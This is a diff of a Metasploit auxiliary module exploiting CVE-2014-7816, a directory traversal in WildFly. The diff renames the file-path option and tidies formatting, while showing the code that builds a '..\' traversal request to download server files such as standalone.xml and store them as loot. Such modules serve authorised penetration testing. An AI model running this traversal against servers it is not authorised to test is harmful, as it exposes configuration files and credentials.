@@ -20,10 +20,10 @@ class Metasploit3 < Msf::Auxiliary
       },
       'References'     =>
         [
-          [ 'CVE', '2014-7816' ],
-          [ 'URL', 'https://access.redhat.com/security/cve/CVE-2014-7816' ],
-          [ 'URL', 'https://www.conviso.com.br/advisories/CONVISO-14-001.txt' ],
-          [ 'URL', 'http://www.openwall.com/lists/oss-security/2014/11/27/4' ]
+          ['CVE', '2014-7816' ],
+          ['URL', 'https://access.redhat.com/security/cve/CVE-2014-7816'],
+          ['URL', 'https://www.conviso.com.br/advisories/CONVISO-14-001.txt'],
+          ['URL', 'http://www.openwall.com/lists/oss-security/2014/11/27/4']
         ],
       'Author'         => 'Roberto Soares Espreto <robertoespreto[at]gmail.com>',
       'License'        => MSF_LICENSE,
@@ -33,23 +33,23 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(8080),
-        OptString.new("FILEPATH", [true, 'Full path to the file to read', 'standalone\\configuration\\standalone.xml']),
+        OptString.new('RELATIVE_FILE_PATH', [true, 'Relative path to the file to read', 'standalone\\configuration\\standalone.xml']),
         OptInt.new('TRAVERSAL_DEPTH', [true, 'Traversal depth', 1])
       ], self.class)
   end
 
   def run_host(ip)
-    print_status("#{peer} - Attempting to download: #{datastore['FILEPATH']}")
+    print_status("#{peer} - Attempting to download: #{datastore['RELATIVE_FILE_PATH']}")
 
     traversal = "..\\" * datastore['TRAVERSAL_DEPTH']
     res = send_request_raw({
       'method' => 'GET',
-      'uri'    => "/#{traversal}\\#{datastore['FILEPATH']}"
+      'uri'    => "/#{traversal}\\#{datastore['RELATIVE_FILE_PATH']}"
     })
 
     if res && res.code == 200
       vprint_line(res.to_s)
-      fname = File.basename(datastore['FILEPATH'])
+      fname = File.basename(datastore['RELATIVE_FILE_PATH'])
 
       path = store_loot(
         'wildfly.http',
